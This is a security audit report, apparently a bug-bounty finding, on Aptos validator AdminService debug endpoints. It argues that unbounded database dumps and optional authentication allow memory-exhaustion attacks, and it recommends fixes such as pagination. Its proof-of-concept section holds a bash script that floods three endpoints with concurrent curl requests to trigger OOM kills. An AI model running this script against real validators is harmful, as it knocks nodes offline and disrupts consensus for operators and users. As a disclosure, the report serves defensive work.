# Audit Report

## Title
AdminService HTTP Endpoints Enable Memory Exhaustion Attacks on Validator Nodes Leading to OOM Kills and Consensus Disruption

## Summary
The AdminService exposes unauthenticated (or weakly authenticated) HTTP debug endpoints on validator nodes that load unbounded amounts of consensus and quorum store database data into memory without pagination, streaming, or size limits. Attackers can trigger memory exhaustion by sending requests to these endpoints, causing validator process OOM kills and consensus disruption.

## Finding Description

The AdminService runs on validator nodes and exposes several HTTP debugging endpoints at `/debug/consensus/*`. These endpoints perform full database scans without memory limits:

**Vulnerable Endpoints:**

1. `/debug/consensus/consensusdb` - Dumps entire consensus database [1](#0-0) 

2. `/debug/consensus/quorumstoredb` - Dumps entire quorum store database [2](#0-1) 

3. `/debug/consensus/block` - Dumps all blocks with transactions [3](#0-2) 

**Memory Exhaustion Path:**

The `dump_blocks()` and `dump_blocks_bcs()` functions load ALL batches and ALL blocks into memory: [4](#0-3) [5](#0-4) 

These functions call `get_all_batches()` which loads ALL quorum store batches into a HashMap: [6](#0-5) 

And `get_data()` which loads ALL blocks and quorum certificates into memory: [7](#0-6) 

The underlying `get_all()` method collects all database entries without pagination: [8](#0-7) 

**Authentication Weakness:**

The authentication can be bypassed entirely if no authentication config is provided: [9](#0-8) 

**Attack Scenario:**

1. AdminService is started on validator nodes during node initialization: [10](#0-9) 

2. Attacker discovers the admin service endpoint (default port 9102)
3. If authentication is not configured or attacker brute-forces/obtains the passcode
4. Attacker sends multiple concurrent HTTP GET requests to `/debug/consensus/block`
5. Each request loads ALL batches (potentially GBs of transaction data) into RAM
6. Each request loads ALL blocks (potentially thousands of blocks) into RAM
7. Memory usage multiplies with concurrent requests
8. System exhausts available RAM, triggering OOM killer
9. OOM killer terminates the validator process
10. Validator goes offline, disrupting consensus participation

## Impact Explanation

**High Severity** per Aptos Bug Bounty criteria: "Validator node slowdowns" and "API crashes"

This vulnerability can cause:
- **Validator Node Crashes**: OOM kills terminate the validator process entirely
- **Consensus Disruption**: Offline validators cannot participate in consensus, reducing network capacity
- **Repeated Attacks**: Attacker can repeatedly trigger OOM kills after node restarts
- **Multi-Validator Impact**: If multiple validators are affected simultaneously, network liveness could be severely degraded

The vulnerability breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." The admin endpoints have no memory limits or resource constraints.

## Likelihood Explanation

**High Likelihood:**

- **Low Complexity**: Simple HTTP GET requests, no special privileges required
- **Default Enabled**: AdminService is enabled by default on non-mainnet chains
- **Authentication Bypass**: Many deployments may not configure authentication properly
- **Observable**: Admin service port (9102) can be discovered via port scanning
- **Amplification**: Single request can consume GBs of RAM, multiple concurrent requests multiply the effect
- **Production Relevance**: Testnet and devnet validators are legitimate targets for disruption

The attack requires only:
1. Network access to the admin service port
2. Knowledge of the endpoint paths (publicly documented)
3. No authentication if not configured, or a SHA256 hash if configured weakly

## Recommendation

**Immediate Mitigations:**

1. **Add Memory Limits**: Implement pagination and streaming for all database dump endpoints
2. **Enforce Strong Authentication**: Require authentication by default, not optional
3. **Rate Limiting**: Add rate limits per IP/client for admin endpoints
4. **Disable by Default**: AdminService should be disabled by default on all chains including testnets
5. **Request Size Limits**: Add configurable limits for response sizes

**Code Fix Example:**

For `dump_blocks()`, add pagination:

```rust
fn dump_blocks_paginated(
    consensus_db: &dyn PersistentLivenessStorage,
    quorum_store_db: &dyn QuorumStoreStorage,
    block_id: Option<HashValue>,
    max_blocks: usize, // Add limit parameter
) -> anyhow::Result<String> {
    let mut body = String::new();
    let all_batches = quorum_store_db.get_all_batches()?;
    let (_, _, blocks, _) = consensus_db.consensus_db().get_data()?;
    
    let blocks_to_process = blocks.into_iter().take(max_blocks); // Limit iteration
    
    for block in blocks_to_process {
        // ... rest of logic
    }
    Ok(body)
}
```

Better approach: Implement streaming responses instead of loading everything into memory.

## Proof of Concept

**Setup:**
1. Start a validator node with AdminService enabled (default on testnet/devnet)
2. Ensure authentication is not configured or use weak/known passcode

**Attack Script:**

```bash
#!/bin/bash
# Memory exhaustion attack on Aptos validator AdminService

ADMIN_URL="http://validator-ip:9102"
PASSCODE="" # Empty if no auth, or actual passcode

# Function to trigger memory-intensive dump
trigger_dump() {
    local endpoint="$1"
    echo "Triggering dump on ${endpoint}..."
    if [ -z "$PASSCODE" ]; then
        curl -s "${ADMIN_URL}${endpoint}" > /dev/null &
    else
        curl -s "${ADMIN_URL}${endpoint}?passcode=${PASSCODE}" > /dev/null &
    fi
}

# Launch multiple concurrent requests to exhaust memory
echo "Starting memory exhaustion attack..."
for i in {1..20}; do
    trigger_dump "/debug/consensus/block"
    trigger_dump "/debug/consensus/consensusdb"
    trigger_dump "/debug/consensus/quorumstoredb"
    sleep 0.1
done

echo "Waiting for concurrent requests to complete..."
wait

echo "Attack completed. Monitor validator for OOM kills."
```

**Verification:**

1. Monitor validator memory usage: `watch -n 1 'free -h'`
2. Monitor for OOM kills: `dmesg | grep -i "out of memory"`
3. Check validator process status: `systemctl status aptos-node`
4. Observe consensus participation drops when validator goes offline

**Expected Result:**
- Memory usage spikes as requests are processed
- System runs out of available RAM
- OOM killer terminates validator process
- Validator stops participating in consensus

## Notes

This vulnerability is particularly critical because:

1. **Production Impact**: Even testnet/devnet disruption is problematic for ecosystem development
2. **No Rate Limiting**: Attacker can repeatedly exploit after node restarts
3. **Amplification Factor**: Database size grows over time, making attacks more effective on older chains
4. **Multi-Vector**: Three different endpoints can be exploited for the same effect

The vulnerability exists because the admin service was designed as a debugging tool without considering the security implications of exposing it on production validator nodes. The endpoints assume trusted operators but are exposed to network access with weak authentication.

### Citations

**File:** crates/aptos-admin-service/src/server/mod.rs (L154-181)
```rust
        let mut authenticated = false;
        if context.config.authentication_configs.is_empty() {
            authenticated = true;
        } else {
            for authentication_config in &context.config.authentication_configs {
                match authentication_config {
                    AuthenticationConfig::PasscodeSha256(passcode_sha256) => {
                        let query = req.uri().query().unwrap_or("");
                        let query_pairs: HashMap<_, _> =
                            url::form_urlencoded::parse(query.as_bytes()).collect();
                        let passcode: Option<String> =
                            query_pairs.get("passcode").map(|p| p.to_string());
                        if let Some(passcode) = passcode {
                            if sha256::digest(passcode) == *passcode_sha256 {
                                authenticated = true;
                            }
                        }
                    },
                }
            }
        };

        if !authenticated {
            return Ok(reply_with_status(
                StatusCode::NETWORK_AUTHENTICATION_REQUIRED,
                format!("{} endpoint requires authentication.", req.uri().path()),
            ));
        }
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L194-203)
```rust
            (hyper::Method::GET, "/debug/consensus/consensusdb") => {
                let consensus_db = context.consensus_db.read().clone();
                if let Some(consensus_db) = consensus_db {
                    consensus::handle_dump_consensus_db_request(req, consensus_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Consensus db is not available.",
                    ))
                }
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L205-214)
```rust
            (hyper::Method::GET, "/debug/consensus/quorumstoredb") => {
                let quorum_store_db = context.quorum_store_db.read().clone();
                if let Some(quorum_store_db) = quorum_store_db {
                    consensus::handle_dump_quorum_store_db_request(req, quorum_store_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Quorum store db is not available.",
                    ))
                }
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L216-228)
```rust
            (hyper::Method::GET, "/debug/consensus/block") => {
                let consensus_db = context.consensus_db.read().clone();
                let quorum_store_db = context.quorum_store_db.read().clone();
                if let Some(consensus_db) = consensus_db
                    && let Some(quorum_store_db) = quorum_store_db
                {
                    consensus::handle_dump_block_request(req, consensus_db, quorum_store_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Consensus db and/or quorum store db is not available.",
                    ))
                }
```

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L179-214)
```rust
fn dump_blocks(
    consensus_db: &dyn PersistentLivenessStorage,
    quorum_store_db: &dyn QuorumStoreStorage,
    block_id: Option<HashValue>,
) -> anyhow::Result<String> {
    let mut body = String::new();

    let all_batches = quorum_store_db.get_all_batches()?;

    let (_, _, blocks, _) = consensus_db.consensus_db().get_data()?;

    for block in blocks {
        let id = block.id();
        if block_id.is_none() || id == block_id.unwrap() {
            body.push_str(&format!("Block ({id:?}): \n\n"));
            match extract_txns_from_block(&block, &all_batches) {
                Ok(txns) => {
                    body.push_str(&format!("{txns:?}"));
                },
                Err(e) => {
                    body.push_str(&format!("Not available: {e:?}"));
                },
            };
            body.push_str("\n\n");
        }
    }

    if body.is_empty() {
        if let Some(block_id) = block_id {
            body.push_str(&format!("Done, block ({block_id:?}) is not found."));
        } else {
            body.push_str("Done, no block is found.");
        }
    }

    Ok(body)
```

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L217-239)
```rust
fn dump_blocks_bcs(
    consensus_db: &dyn PersistentLivenessStorage,
    quorum_store_db: &dyn QuorumStoreStorage,
    block_id: Option<HashValue>,
) -> anyhow::Result<Vec<u8>> {
    let all_batches = quorum_store_db.get_all_batches()?;

    let (_, _, blocks, _) = consensus_db.consensus_db().get_data()?;

    let mut all_txns = Vec::new();
    for block in blocks {
        let id = block.id();
        if block_id.is_none() || id == block_id.unwrap() {
            match extract_txns_from_block(&block, &all_batches) {
                Ok(txns) => {
                    all_txns.extend(txns.into_iter().cloned().map(Transaction::UserTransaction));
                },
                Err(e) => bail!("Failed to extract txns from block ({id:?}): {e:?}."),
            };
        }
    }

    bcs::to_bytes(&all_txns).map_err(Error::msg)
```

**File:** consensus/src/quorum_store/quorum_store_db.rs (L103-108)
```rust
    fn get_all_batches(&self) -> Result<HashMap<HashValue, PersistedValue<BatchInfo>>> {
        let mut iter = self.db.iter::<BatchSchema>()?;
        iter.seek_to_first();
        iter.map(|res| res.map_err(Into::into))
            .collect::<Result<HashMap<HashValue, PersistedValue<BatchInfo>>>>()
    }
```

**File:** consensus/src/consensusdb/mod.rs (L80-106)
```rust
    pub fn get_data(
        &self,
    ) -> Result<(
        Option<Vec<u8>>,
        Option<Vec<u8>>,
        Vec<Block>,
        Vec<QuorumCert>,
    )> {
        let last_vote = self.get_last_vote()?;
        let highest_2chain_timeout_certificate = self.get_highest_2chain_timeout_certificate()?;
        let consensus_blocks = self
            .get_all::<BlockSchema>()?
            .into_iter()
            .map(|(_, block)| block)
            .collect();
        let consensus_qcs = self
            .get_all::<QCSchema>()?
            .into_iter()
            .map(|(_, qc)| qc)
            .collect();
        Ok((
            last_vote,
            highest_2chain_timeout_certificate,
            consensus_blocks,
            consensus_qcs,
        ))
    }
```

**File:** consensus/src/consensusdb/mod.rs (L201-205)
```rust
    pub fn get_all<S: Schema>(&self) -> Result<Vec<(S::Key, S::Value)>, DbError> {
        let mut iter = self.db.iter::<S>()?;
        iter.seek_to_first();
        Ok(iter.collect::<Result<Vec<(S::Key, S::Value)>, AptosDbError>>()?)
    }
```

**File:** aptos-node/src/services.rs (L206-209)
```rust
/// Spawns a new thread for the admin service
pub fn start_admin_service(node_config: &NodeConfig) -> AdminService {
    AdminService::new(node_config)
}
```
